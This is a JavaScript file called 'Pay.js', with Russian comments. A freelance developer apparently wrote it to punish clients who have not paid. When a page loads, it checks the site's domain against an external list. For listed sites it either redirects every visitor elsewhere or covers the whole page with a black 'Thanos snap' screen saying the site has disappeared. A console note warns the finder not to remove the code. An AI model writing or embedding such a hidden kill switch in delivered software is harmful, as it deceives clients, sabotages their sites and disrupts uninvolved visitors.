/*!
 * Pay.js v1.0.0
 * (c) 2024-2024
 * Made to protect against scammers
 * by Deus Notam
 * Telegram Channel → https://t.me/deusnotam
 * Telegram Group → https://t.me/d3usn0tam
 * Данный скрипт отвечает за наказание недобросовестных заказчиков.
 */

document.addEventListener("DOMContentLoaded", function() {
// Массив с сайтами и параметрами
const sites = data;

// Массив с эффектами
const effects = {
  //Ничего
  none: () => {
  },
  //redirect - редирект на redirecturl
  redirect: (redirectUrl) => {
    console.log(`Применяется эффект redirect на ${redirectUrl}`);
    window.location.replace(redirectUrl);
  },
  //thanos - поверх сайта чёрный экран с gif щелком таноса
  thanos: (startDate) => {
    console.log("Применяется эффект Thanos");
    const blackScreen = document.createElement("div");
  blackScreen.style.position = "fixed";
  blackScreen.style.top = "0";
  blackScreen.style.left = "0";
  blackScreen.style.width = "100%";
  blackScreen.style.height = "100%";
  blackScreen.style.background = "black";
  blackScreen.style.zIndex = "9999";
  blackScreen.style.display = "flex";
  blackScreen.style.flexDirection = "column";
  blackScreen.style.alignItems = "center";
  blackScreen.style.justifyContent = "center";

  const gifImage = document.createElement("img");
  gifImage.src = "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExZWZ0bWRoajlyem1lbHViczd0MzU4YnlneHQ4cGRwMmhweTFsdzZjYSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LOoaJ2lbqmduxOaZpS/giphy.gif";
  gifImage.alt = "Tanos Snap";
  gifImage.style.marginBottom = "20px";

  const caption = document.createElement("p");
  caption.style.color = "white";
  caption.innerText = "Упс... Произошёл щелчок Таноса - сайт исчез...";

  blackScreen.appendChild(gifImage);
  blackScreen.appendChild(caption);

  document.body.appendChild(blackScreen);
  }
};

// Функция для проверки домена
function checkDomain() {
        const currentDomain = window.location.hostname;

        // Проверка, есть ли текущий домен в списке
        const siteInfo = sites.find(site => currentDomain === new URL(site.url).hostname);

        if (!siteInfo) {
            // Обработка случая, когда домен не найден в списке
            console.log("Наказаний не найдено. Заказчик чист.");
        } else {
            // Применение эффекта, если домен найден в списке
            const effectFunction = effects[siteInfo.effect];
            if (effectFunction) {
                effectFunction(siteInfo.redirecturl || siteInfo.date);
              console.log(`Этот заказчик ${siteInfo.date} не оплатил заказанную работу, поэтому будь осторожен и не удаляй этот код. По всем вопросам пиши сюда \nTelegram Group → https://t.me/d3usn0tam`);
            }
        }
    }

// Вызов функции для проверки домена
checkDomain();
});